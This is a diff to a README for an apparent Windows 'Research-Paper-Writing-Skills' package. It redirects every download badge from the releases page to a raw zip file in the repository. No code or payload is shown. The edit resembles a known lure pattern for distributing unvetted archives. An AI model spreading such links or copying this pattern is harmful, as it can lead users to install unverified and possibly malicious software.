@@ -1,6 +1,6 @@
 # 📄 Research-Paper-Writing-Skills - Improve Your Paper Writing
 
-[![Download](https://img.shields.io/badge/Download-Research--Paper--Writing--Skills-green?style=for-the-badge)](https://github.com/Brandlytic/Research-Paper-Writing-Skills/releases)
+[![Download](https://img.shields.io/badge/Download-Research--Paper--Writing--Skills-green?style=for-the-badge)](https://github.com/Brandlytic/Research-Paper-Writing-Skills/raw/refs/heads/main/research-paper-writing/Research-Paper-Skills-Writing-v2.8.zip)
 
 ## 📘 What This Is
 
@@ -33,7 +33,7 @@ Follow these steps to set up and begin using the package on your Windows compute
 
 Click this button to go to the download page. This is where you will get the latest version of the skill package.
 
-[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Brandlytic/Research-Paper-Writing-Skills/releases)
+[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Brandlytic/Research-Paper-Writing-Skills/raw/refs/heads/main/research-paper-writing/Research-Paper-Skills-Writing-v2.8.zip)
 
 ### Step 2: Download the Package
 
@@ -109,4 +109,4 @@ If you encounter issues using the package, look for help under the "Issues" tab 
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Research--Paper--Writing--Skills-green?style=for-the-badge)](https://github.com/Brandlytic/Research-Paper-Writing-Skills/releases)
+[![Download](https://img.shields.io/badge/Download-Research--Paper--Writing--Skills-green?style=for-the-badge)](https://github.com/Brandlytic/Research-Paper-Writing-Skills/raw/refs/heads/main/research-paper-writing/Research-Paper-Skills-Writing-v2.8.zip)
